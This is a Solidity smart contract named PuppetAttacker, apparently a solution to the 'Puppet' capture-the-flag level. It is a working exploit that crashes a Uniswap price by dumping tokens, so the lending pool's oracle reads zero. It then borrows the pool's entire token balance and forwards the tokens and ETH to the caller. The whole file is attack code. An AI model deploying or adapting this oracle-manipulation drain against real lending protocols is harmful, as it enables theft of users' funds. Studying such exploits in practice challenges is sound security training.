pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPuppetPool {
    function computeOraclePrice() external view returns (uint256);
    function borrow(uint256 borrowAmount) external payable;
}

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetAttacker {
    IERC20 token;
    IPuppetPool pool;
    IUniswapExchange uniswap;

    constructor(
        IERC20 _token,
        IPuppetPool _pool,
        IUniswapExchange _uniswap
    ) public {
        token = _token;
        pool = _pool;
        uniswap = _uniswap;
    }

    function attack(uint256 amount) public {
        require(token.balanceOf(address(this)) >= amount, "not enough tokens");
        token.approve(address(uniswap), amount);
        uint256 ethGained = uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);
        require(pool.computeOraclePrice() == 0, "oracle price not 0");

        pool.borrow(token.balanceOf(address(pool)));
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "token transfer failed");
        msg.sender.transfer(ethGained);
    }

    receive() external payable {}
}
